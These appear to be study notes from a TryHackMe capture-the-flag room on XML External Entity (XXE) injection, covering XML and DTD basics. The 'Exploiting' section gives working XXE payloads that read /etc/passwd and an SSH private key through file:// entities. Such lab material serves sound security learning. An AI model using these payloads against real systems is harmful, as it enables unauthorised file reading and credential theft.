# Room
https://tryhackme.com/room/xxe

# Task 1 - Deploy
XXE = XML External Entity.  It abuses features of the XML parsers and data can allow an attacker to interact with the backend
* Two types of XXE
    * In band - an attacker can receive an immediate response
    * Out of band - no immediate response, attacker has to reflect the payload to their own server to get results

# Task 2 - eXtensible Markup Language
XML is a markup language that defines a set of rules for encoding documents, it is human and machine readable
* Attributes of XML
    * platform independent
    * data stored and transported can be changed at any time
    * allows validation using DTD and a schema
    * simplifies data sharing since no conversion between different systems is required
* Syntax
    * document header - prolog
    ```
    <?xml version="1.0" encoding="UTF-8"?>
    ```
    * root element - required
    * children elements - data
    * tags are case sensitive
    * can use attributes
# Task 3 - DTD
DTD = Document Type Definition.  DTD defines the structure, legal elements, and attributes of an XML document
* Saved with dtd file extension
* Uses !DOCTYPE, !ELEMENT, and !ENTITY structures

# Task 4 - XXE Payload
XXE payloads allow you to read data

# Task 5 - Exploiting
* Display your name
    ```
    <!DOCTYPE replace [<!ENTITY name "rogers"> ]>
    <userInfo>
    <firstName>bob</firstName>
    <lastName>&name;</lastName>
    </userInfo>
    ```
* Display /etc/passwd
    ```
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
    <root>&read;</root>    
    ```
* Display SSH private key
    ```
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
    <root>&read;</root>        
    ```